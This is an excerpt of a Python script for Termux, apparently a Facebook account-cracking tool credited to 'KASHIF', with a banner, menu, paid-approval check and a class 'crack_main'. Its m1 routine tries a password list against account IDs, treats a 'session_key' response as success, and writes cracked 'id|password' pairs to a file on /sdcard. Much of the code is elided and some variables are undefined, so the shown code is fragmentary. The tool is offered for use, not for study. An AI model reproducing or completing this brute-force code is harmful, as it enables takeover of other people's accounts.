#SOURCE BY : KASHIF
#GITHUB : https://github.com/HACKER.git
#coding = utf-8
...
logo = f'''""
          \033[1;31m _   __  ___   _____ _   _ _____ ______ 
          \033[1;32m| | / / / _ \ /  ___| | | |_   _|  ___| 
          \033[1;33m| |/ / / /_\ \\ `--.   |_| | | | | |_.
          \033[1;31m|    \ |  _  | `--. \  _  | | | |  _| 
          \033[1;32m| |\  \| | | |/\__/ / | | |_| |_| |  
          \033[1;33m\_| \_/\_| |_/\____/\_| |_/\___/\_| +KFT
                                                 
{50*"-"}
  Owner     :  https://www.facebook.com/K45H1F.009
  Tool Version :   3.4
  Thanks Alot  :  KASHIF x MAX
{50*"-"}'''
...
def qsbuy():
        try:
                os.system('clear')
                print(logo)
                x = requests.get('https://github.com/TECH-KASHIF/HACKER/blob/main/Apv.txt').text
                if str("upppdate") in update:
                        ...
                        os.system(f"termux-open-url https://wa.me/+923081851371?text={bumper}")
                        qsbuy()
...
def main():
        ...
        if menu_opt =='1':
                ...
                xchker()
                os.system('xdg-open  https://www.facebook.com/K45H1F.009')
                main()
        elif menu_opt =='4':
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[KASHIF_X♥] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[KASHIF_X♥-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/KASHIF_X♥_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/KASHIF_X♥_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()
...
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/KASHIF_X♥' in datar:
        pass
else:
        for i in range(5000):
                print(" data is forked / or in other file")
        exit("Type > cd ~ && python za.py")
